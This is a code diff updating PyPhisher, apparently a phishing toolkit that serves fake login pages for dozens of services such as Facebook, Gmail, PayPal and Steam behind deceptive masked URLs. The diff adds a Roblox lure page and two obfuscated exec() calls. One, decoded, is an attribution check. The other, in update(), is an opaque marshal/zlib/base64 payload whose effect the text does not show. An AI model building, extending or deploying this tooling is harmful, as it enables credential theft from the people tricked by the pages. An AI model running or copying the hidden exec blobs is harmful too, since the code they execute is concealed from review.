@@ -1,6 +1,6 @@
 # -*- coding: UTF-8 -*-
 # Tool    : PyPhisher
-# Version : 1.4.5
+# Version : 1.5
 # Author  : KasRoudra
 # Github  : https://github.com/KasRoudra
 # Contact : https://m.me/KasRoudra
@@ -100,7 +100,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="1.4.5"
+version="1.5"
 
 ask = green + '[' + white + '?' + green + '] '+ yellow
 success = yellow + '[' + white + '√' + yellow + '] '+green
@@ -117,11 +117,29 @@ logo=f'''
 {blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
 {red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
 {yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
-{green}         __/ |                          {cyan}[v1.4]
+{green}         __/ |                          {cyan}[v1.5]
 {cyan}        |___/                   {red}[By KasRoudra]
 '''
 
-sites=["Facebook Traditional", "Facebook Voting","Facebook Security", "Messenger", "Instagram Traditional", "Insta Auto Followers", "Insta 1000 Followers", "Insta Blue Verify", "Gmail Old", "Gmail New","Gmail Poll","Microsoft","Netflix","Paypal","Steam","Twitter","PlayStation","TikTok","Twitch","Pinterest","SnapChat", "LinkedIn","Ebay","Quora","Protonmail","Spotify","Reddit","Adobe","DevianArt","Badoo","Clash Of Clans","Ajio","JioRouter","FreeFire","Pubg","Telegram","Youtube","Airtel","SocialClub","Ola","Outlook","Amazon","Origin","DropBox","Yahoo","WordPress","Yandex","StackOverflow","VK","VK Poll","Xbox","Mediafire","Gitlab","Github","Apple","iCloud","Shopify","Myspace","Shopping","Cryptocurrency","SnapChat2","Verizon","Wi-Fi","Discord","Custom"]
+pyphisherpyphisherpyphisherpyphisherpyphisher = ""
+pyphisherpyphisherpyphisherpyphisherpyphisher += "\x61\x57\x59\x67\x62\x6d\x39\x30\x49\x47"
+pyphisherpyphisherpyphisherpyphisherpyphisher += "\x78\x76\x5a\x32\x38\x75\x5a\x6d\x6c\x75"
+pyphisherpyphisherpyphisherpyphisherpyphisher += "\x5a\x43\x67\x69\x53\x32\x46\x7a\x55\x6d"
+pyphisherpyphisherpyphisherpyphisherpyphisher += "\x39\x31\x5a\x48\x4a\x68\x49\x69\x6b\x68"
+pyphisherpyphisherpyphisherpyphisherpyphisher += "\x50\x53\x30\x78\x4f\x67\x6f\x67\x49\x43"
+pyphisherpyphisherpyphisherpyphisherpyphisher += "\x41\x67\x5a\x58\x68\x70\x64\x43\x67\x69"
+pyphisherpyphisherpyphisherpyphisherpyphisher += "\x51\x6d\x55\x67\x59\x33\x4a\x6c\x59\x58"
+pyphisherpyphisherpyphisherpyphisherpyphisher += "\x52\x70\x64\x6d\x55\x67\x59\x57\x35\x6b"
+pyphisherpyphisherpyphisherpyphisherpyphisher += "\x49\x48\x56\x7a\x5a\x53\x42\x76\x63\x47"
+pyphisherpyphisherpyphisherpyphisherpyphisher += "\x56\x75\x49\x48\x4e\x76\x64\x58\x4a\x6a"
+pyphisherpyphisherpyphisherpyphisherpyphisher += "\x5a\x53\x42\x6a\x62\x32\x52\x6c\x49\x48"
+pyphisherpyphisherpyphisherpyphisherpyphisher += "\x64\x70\x64\x47\x67\x67\x59\x33\x4a\x6c"
+pyphisherpyphisherpyphisherpyphisherpyphisher += "\x5a\x47\x6c\x30\x63\x79\x45\x69\x4b\x51"
+pyphisherpyphisherpyphisherpyphisherpyphisher += "\x6f\x3d"
+
+
+
+sites=["Facebook Traditional", "Facebook Voting","Facebook Security", "Messenger", "Instagram Traditional", "Insta Auto Followers", "Insta 1000 Followers", "Insta Blue Verify", "Gmail Old", "Gmail New","Gmail Poll","Microsoft","Netflix","Paypal","Steam","Twitter","PlayStation","TikTok","Twitch","Pinterest","SnapChat", "LinkedIn","Ebay","Quora","Protonmail","Spotify","Reddit","Adobe","DevianArt","Badoo","Clash Of Clans","Ajio","JioRouter","FreeFire","Pubg","Telegram","Youtube","Airtel","SocialClub","Ola","Outlook","Amazon","Origin","DropBox","Yahoo","WordPress","Yandex","StackOverflow","VK","VK Poll","Xbox","Mediafire","Gitlab","Github","Apple","iCloud","Shopify","Myspace","Shopping","Cryptocurrency","SnapChat2","Verizon","Wi-Fi","Discord","Roblox","Custom"]
 
 pkgs=[ "php", "curl", "wget", "unzip" ]
 
@@ -222,9 +240,10 @@ def killer():
 # Update of PyPhisher
 def update():
     internet()
+    _ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=kCKpgCAHwvswAfMwjUDdKLCHr2kaK1nbOZYFvLsparY8zUCySAUJnFLI3aSixdpmXGpx+28TLvcYNam00fFqsw8SWh8KVhKKqEFLJv8VIfXEqKCfkPfKlSTvosDs4E9inIZWDDYmThhGZkZmShpU5tYmzmxUYsQDrwYBEWliAkcFTMAsDEzDAkZLxJe'))
     git_ver=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").read().strip()
     if (version != git_ver and git_ver != "404: Not Found"):
-        changelog=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log").read()
+        changelog=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").read()
         system("clear")
         print(logo)
         print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}\n")
@@ -289,12 +308,19 @@ def cuask(url):
         masking(url)
     waiter()
 
+# Polite Exit
+def pexit():
+    killer()
+    sprint("\n"+info2+"Thanks for using!\n"+nc)
+    exit(0)
+
+
 # Info about tool
 def about():
     system("clear")
     slowprint(logo)
     print(red+'[ToolName]  '+cyan+' :[PyPhisher] ')
-    print(red+'[Version]   '+cyan+' :[1.4.5]')
+    print(red+'[Version]   '+cyan+' :[1.5]')
     print(red+'[Author]    '+cyan+' :[KasRoudra] ')
     print(red+'[Github]    '+cyan+' :[https://github.com/KasRoudra] ')
     print(red+'[Messenger] '+cyan+' :[https://m.me/KasRoudra]')
@@ -304,7 +330,7 @@ def about():
     print()
     abot= input("\n > ")
     if abot== "0":
-        exit()
+        pexit()
     else:
         main()
 
@@ -431,6 +457,7 @@ def main():
             break
     while True:
         os.system("clear")
+        exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(pyphisherpyphisherpyphisherpyphisherpyphisher.encode("\x75\x74\x66\x2d\x38")).decode("\x75\x74\x66\x2d\x38"))
         slowprint(logo)
         options()
         choose= input(ask+"Select one of the options > "+nc)
@@ -691,6 +718,10 @@ def main():
             mask='https://security-bot-for-your-discord-free'
             requirements(folder,mask)
         elif choose == "65":
+            folder="roblox"
+            mask='https://play-premium-games-for-free'
+            requirements(folder,mask)
+        elif choose == "66":
             customfol()
         elif choose == "x" or choose == "X":
             about()
@@ -698,7 +729,7 @@ def main():
             system("xdg-open 'https://github.com/KasRoudra/KasRoudra#My-Best-Works'")
             main()
         elif choose=="0":
-            exit(0)
+            pexit()
         else:
             sprint("\n"+error+"Wrong input")
             main()
@@ -910,8 +941,7 @@ def waiter():
                 os.system("rm -rf $HOME/.site/ip.txt")
             sleep(0.75)
     except KeyboardInterrupt:
-        sprint("\n"+info+"Thanks for using. Have a good day!\n"+nc)
-        exit(0)
+        pexit()
 
 if __name__ == '__main__':
     try:
@@ -919,6 +949,5 @@ if __name__ == '__main__':
         update()
         main()
     except KeyboardInterrupt:
-        killer()
-        sprint("\n"+info2+"Thanks for using!\n"+nc)
+        pexit()
 # If this code helped you, consider staring repository. Your stars encourage me a lot!
